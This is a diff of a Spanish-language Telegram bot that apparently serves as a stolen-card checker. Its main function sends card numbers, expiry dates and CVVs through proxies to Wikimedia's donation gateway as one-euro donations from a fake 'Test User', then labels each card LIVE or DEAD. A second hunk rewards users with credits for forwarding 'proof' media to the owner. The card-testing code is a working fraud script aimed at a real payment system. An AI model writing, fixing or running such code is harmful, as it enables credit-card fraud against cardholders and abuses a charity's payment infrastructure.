@@ -75,24 +75,71 @@ def adyen_check(cc, mes, ano, cvv):
     try:
         s = requests.Session()
         s.proxies.update(PROXY)
-        s.headers.update({"User-Agent": "Mozilla/5.0"})
-        r = s.get("https://payments.wikimedia.org/index.php?title=Special:GravyGateway&appeal=WP25&country=ES&currency=EUR&payment_method=cc&gateway=gravy&amount=1.0&uselang=es-419", timeout=20)
+        s.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})
+
+        # Obtener página fresca
+        r = s.get(
+            "https://payments.wikimedia.org/index.php?title=Special:GravyGateway&appeal=WP25&country=ES&currency=EUR&payment_method=cc&gateway=gravy&amount=1.0&uselang=es-419",
+            timeout=25
+        )
         html = r.text
+
+        # Extraer wmf_token
         wmf_token = ""
         for line in html.splitlines():
             if 'name="wmf_token"' in line and 'value="' in line:
                 wmf_token = line.split('value="')[1].split('"')[0]
                 break
+
+        # Extraer gravy_session_id
         m = re.search(r'gravy_session_id["\']?\s*:\s*["\']([^"\']+)', html)
         gravy_session = m.group(1) if m else None
-        yy = ano[-2:] if len(ano) == 4 else ano
-        exp = f"{mes}/{yy}"
-        s.put(f"https://api.wikimedia.gr4vy.app/checkout/sessions/{gravy_session}/fields", json={"payment_method": {"method": "card", "number": cc, "expiration_date": exp, "security_code": cvv}}, timeout=15)
-        donate = {"action": "di_donate_gravy", "gateway": "gravy", "currency": "EUR", "amount": "1.0", "first_name": "Test", "last_name": "User", "email": "test@live.com", "country": "ES", "payment_method": "cc", "gateway_session_id": gravy_session, "wmf_token": wmf_token or "dummy", "format": "json"}
-        r = s.post("https://payments.wikimedia.org/api.php", data=donate, timeout=20)
-        result = r.json().get("result", {})
-        return "LIVE" if not result.get("errors") and not result.get("isFailed") else "DEAD"
-    except:
+
+        if not wmf_token or not gravy_session:
+            return "DEAD"
+
+        # Tokenizar tarjeta
+        exp = f"{mes.zfill(2)}/{str(ano)[-2:]}"
+        token_data = {
+            "payment_method": {
+                "method": "card",
+                "number": cc,
+                "expiration_date": exp,
+                "security_code": cvv
+            }
+        }
+        s.put(f"https://api.wikimedia.gr4vy.app/checkout/sessions/{gravy_session}/fields", json=token_data, timeout=15)
+
+        # Enviar donación
+        donate = {
+            "action": "di_donate_gravy",
+            "gateway": "gravy",
+            "currency": "EUR",
+            "amount": "1.00",
+            "first_name": "Test",
+            "last_name": "User",
+            "email": "test@live.com",
+            "country": "ES",
+            "payment_method": "cc",
+            "gateway_session_id": gravy_session,
+            "wmf_token": wmf_token,
+            "format": "json"
+        }
+
+        r = s.post("https://payments.wikimedia.org/api.php", data=donate, timeout=25)
+        response = r.json()
+
+        result = response.get("result", {})
+        errors = result.get("errors", {})
+
+        if errors or result.get("isFailed", False):
+            return "DEAD"
+        if "redirect" in result or "iframe" in result or not result.get("isFailed", True):
+            return "LIVE"
+
+        return "DEAD"
+    except Exception as e:
+        print(f"Adyen Error: {e}")
         return "DEAD"
 
 # ================= GEN =================
@@ -276,13 +323,18 @@ async def addr(msg: types.Message):
 
 @dp.message(F.text.startswith(("/refe", ".refe")))
 async def refe(msg: types.Message):
-    if msg.reply_to_message and (msg.reply_to_message.photo or msg.reply_to_message.video or msg.reply_to_message.animation):
-        await bot.forward_message(ADMIN_ID, msg.chat.id, msg.reply_to_message.message_id)
-        add_credits(str(msg.from_user.id), 5)
-        await msg.answer("✅ Foto/Video reenviada al owner +5 créditos")
-    else:
-        await msg.answer("❌ Por favor, usa `/refe` respondiendo a una imagen/video/GIF.")
+    if not msg.reply_to_message:
+        return await msg.answer("❌ Usa `/refe` **respondiendo** a una foto, video o GIF.")
 
+    if msg.reply_to_message.photo or msg.reply_to_message.video or msg.reply_to_message.animation:
+        try:
+            await bot.forward_message(ADMIN_ID, msg.chat.id, msg.reply_to_message.message_id)
+            add_credits(str(msg.from_user.id), 5)
+            await msg.answer("✅ **Prueba reenviada al Owner** +5 créditos")
+        except:
+            await msg.answer("❌ Error al reenviar. Inténtalo de nuevo.")
+    else:
+        await msg.answer("❌ Solo se aceptan **imágenes, videos o GIFs**.")
 # ================= INFO =================
 @dp.message(F.text.startswith(("/info", ".info")))
 async def info(msg: types.Message):
